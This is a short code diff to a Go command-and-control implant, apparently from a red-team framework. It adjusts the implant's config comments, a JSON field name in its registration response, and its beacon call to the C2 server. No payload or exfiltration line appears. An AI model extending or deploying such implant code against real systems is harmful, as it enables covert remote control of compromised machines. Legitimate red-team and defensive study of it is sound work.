@@ -13,7 +13,7 @@ import (
 type ImplantConfig struct {
 	Dwell  string  `json:"dwell"` // base interval time between C2 beacon check-ins (e.g., “5m” for a five-minute dwell before adding jitter)
 	Jitter float64 `json:"jitter"`
-	//TODO:  ENCRYPTION FIELDS, TIMEOUT, USEPROXY, ENDPOINTS
+	//TODO:  ENCRYPTION FIELDS, TIMEOUT, USEPROXY, ENDPOINTS - then fix in listener ImplantConfig as well
 }
 
 type Implant struct {
@@ -74,7 +74,7 @@ func (i *Implant) register() (string, error) {
 
 	var out struct {
 		ID           uint           `json:"id"`
-		CommProtocol string         `json:"commProtocol"`
+		CommProtocol string         `json:"comm_protocol"`
 		Config       *ImplantConfig `json:"config"`
 	}
 	if err = json.NewDecoder(resp.Body).Decode(&out); err != nil {
@@ -115,7 +115,7 @@ func (i *Implant) BeaconLoop() error {
 		// perform beacon
 		// TODO: instead of returning TaskQueue, error, should return TaskQueue, malformedTasks []Task -> then use those to create a result
 		var err error
-		i.TaskQueue, err = i.C2Communicator.Beacon(i.Results)
+		i.TaskQueue, err = i.C2Communicator.Beacon(i.ID, i.Results)
 		if err != nil {
 			return nil
 		}
